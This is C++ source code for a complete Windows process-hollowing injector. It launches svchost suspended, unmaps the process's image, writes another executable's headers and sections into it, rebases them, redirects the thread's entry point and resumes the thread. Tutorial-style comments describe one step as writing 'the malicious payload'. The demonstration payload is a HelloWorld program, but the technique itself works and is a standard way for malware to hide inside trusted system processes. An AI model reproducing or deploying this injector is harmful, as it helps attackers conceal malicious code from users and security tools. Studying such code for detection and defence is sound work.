#include <stdio.h>
#include <windows.h>
#include <tchar.h>
#include <string.h>
#include <fileapi.h>
#include "PE.h"
#include "internals.h"

#pragma warning(disable : 4996)

void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
{

	printf("Creating process\r\n");		// To be printed in the CMD.

	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();	/* Contains information which is used to control how the process 
								   behaves and appears on startup. */

	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();	  /* Contains information about a newly created 
									     process and its primary thread. */
	CreateProcessA		//	The function used to create a process.
	(
		0,
		pDestCmdLine,		
		0, 
		0, 
		0, 
		CREATE_SUSPENDED, 	// The flag that indicates the system to suspend the process.
		0, 
		0, 
		pStartupInfo, 
		pProcessInfo
	);

	if (!pProcessInfo->hProcess)	// Making sure that 'hprocess' is set, if not, stop the function.
	{
		printf("Error creating process\r\n");

		return;
	}

	PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);

	PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);

	printf("Opening source image\r\n");

	HANDLE hFile = CreateFileA		//	This function creates or opens a file or an I/O device.
	(
		pSourceFile,		//	The directory of HelloWorld.exe we initially set to "CreateHollowedProcess".
		GENERIC_READ,		//	The access right.
		0, 
		0, 
		OPEN_ALWAYS,		//	If the specified file exists, the function succeeds.
		0, 
		0
	);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Error opening %s\r\n", pSourceFile);
		return;
	}

	DWORD dwSize = GetFileSize(hFile, 0);
	PBYTE pBuffer = new BYTE[dwSize];
	DWORD dwBytesRead = 0;
	ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);

	PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);	/*	Calling the "GetLoadedImage" functiom in order to
										get the pointer to the source image.	*/

	PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);	/*	Calling the "GetNTHeadrs" functiom in order to
											get the pointer to the source image's headrs.	*/

	printf("Unmapping destination section\r\n");

	HMODULE hNTDLL = GetModuleHandleA("ntdll");		//	Used to get the handles from a module that was already loaded.

	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");	//	Used to get the function we require from ntdll.

	_NtUnmapViewOfSection NtUnmapViewOfSection =
		(_NtUnmapViewOfSection)fpNtUnmapViewOfSection;

	DWORD dwResult = NtUnmapViewOfSection		//	The actual setting of the function in order to unmap a section.
	(
		pProcessInfo->hProcess, 
		pPEB->ImageBaseAddress
	);

	if (dwResult)
	{
		printf("Error unmapping section\r\n");
		return;
	}

	printf("Allocating memory\r\n");

	PVOID pRemoteImage = VirtualAllocEx		//	Reserves, commits, or changes the state of a region of memory 
	(						//	within the virtual address space of a specified process.
		pProcessInfo->hProcess,
		pPEB->ImageBaseAddress,
		pSourceHeaders->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if (!pRemoteImage)
	{
		printf("VirtualAllocEx call failed\r\n");
		return;
	}

	DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress -		//	This is the calculation of the delta between the 'source' 
		pSourceHeaders->OptionalHeader.ImageBase;	//	and 'destination' memory addresses.

	printf
	(
		"Source image base: 0x%p\r\n",
		unsigned long(pSourceHeaders->OptionalHeader.ImageBase)
	);

	printf
	(
		"Destination image base: 0x%p\r\n",
		unsigned long (pPEB->ImageBaseAddress)
	);

	printf("Relocation delta: 0x%p\r\n", dwDelta);

	pSourceHeaders->OptionalHeader.ImageBase = (DWORD)pPEB->ImageBaseAddress;		// Assigning the 'destination' image pointer as the 'source' image pointer.

	printf("Writing headers\r\n");

	if (!WriteProcessMemory			//	Used to write the malicious payload to the remote process.
	(
		pProcessInfo->hProcess, 				
		pPEB->ImageBaseAddress, 
		pBuffer, 
		pSourceHeaders->OptionalHeader.SizeOfHeaders, 
		0
	))
	{
		printf("Error writing process memory\r\n");

		return;
	}

	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
	{
		if (!pSourceImage->Sections[x].PointerToRawData)
			continue;

		PVOID pSectionDestination = 
			(PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);

		printf("Writing %s section to 0x%p\r\n", pSourceImage->Sections[x].Name, pSectionDestination);

		if (!WriteProcessMemory
		(
			pProcessInfo->hProcess,			
			pSectionDestination,			
			&pBuffer[pSourceImage->Sections[x].PointerToRawData],
			pSourceImage->Sections[x].SizeOfRawData,
			0
		))
		{
			printf ("Error writing process memory\r\n");
			return;
		}
	}	

	if (dwDelta)	//	Checking if the delta between the 'destination' and 'source' images is not 0.
		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)			
		{
			const char pSectionName[] = ".reloc";						

			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))		//	Getting ready to use the ".reloc" section.
				continue;

			printf("Rebasing image\r\n");

			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
			DWORD dwOffset = 0;

			IMAGE_DATA_DIRECTORY relocData = 
				pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];		//	The pointer to the relocation table.	

			while (dwOffset < relocData.Size)	
			{
				PBASE_RELOCATION_BLOCK pBlockheader = 
					(PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];

				dwOffset += sizeof(BASE_RELOCATION_BLOCK);

				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

				PBASE_RELOCATION_ENTRY pBlocks = 
					(PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];

				for (DWORD y = 0; y <  dwEntryCount; y++)
				{
					dwOffset += sizeof(BASE_RELOCATION_ENTRY);

					if (pBlocks[y].Type == 0)
						continue;

					DWORD dwFieldAddress = 
						pBlockheader->PageAddress + pBlocks[y].Offset;

					DWORD dwBuffer = 0;
					ReadProcessMemory
					(
						pProcessInfo->hProcess, 
						(PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0
					);

					//printf("Relocating 0x%p -> 0x%p\r\n", dwBuffer, dwBuffer - dwDelta);

					dwBuffer += dwDelta;

					BOOL bSuccess = WriteProcessMemory
					(
						pProcessInfo->hProcess,
						(PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0
					);

					if (!bSuccess)
					{
						printf("Error writing memory\r\n");
						continue;
					}
				}
			}

			break;
		}


		DWORD dwBreakpoint = 0xCC;

		DWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress +
			pSourceHeaders->OptionalHeader.AddressOfEntryPoint;

#ifdef WRITE_BP
		printf("Writing breakpoint\r\n");

		if (!WriteProcessMemory
			(
			pProcessInfo->hProcess, 
			(PVOID)dwEntrypoint, 
			&dwBreakpoint, 
			4, 
			0
			))
		{
			printf("Error writing breakpoint\r\n");
			return;
		}
#endif

		LPCONTEXT pContext = new CONTEXT();
		pContext->ContextFlags = CONTEXT_INTEGER;

		printf("Getting thread context\r\n");

		if (!GetThreadContext(pProcessInfo->hThread, pContext))
		{
			printf("Error getting context\r\n");
			return;
		}

		pContext->Eax = dwEntrypoint;			

		printf("Setting thread context\r\n");

		if (!SetThreadContext(pProcessInfo->hThread, pContext))
		{
			printf("Error setting context\r\n");
			return;
		}

		printf("Resuming thread\r\n");

		if (!ResumeThread(pProcessInfo->hThread))
		{
			printf("Error resuming thread\r\n");
			return;
		}

		printf("Process hollowing complete\r\n");
}

int main(int argc, _TCHAR * argv[])
{
	char* pPath = new char[MAX_PATH];
	GetModuleFileNameA(0, pPath, MAX_PATH);
	pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
	strcat(pPath, "helloworld.exe");
	
	char tSvchost[] = "svchost";

	CreateHollowedProcess
	(
		tSvchost,
		pPath
	);

	system("pause");

	return 0;
}
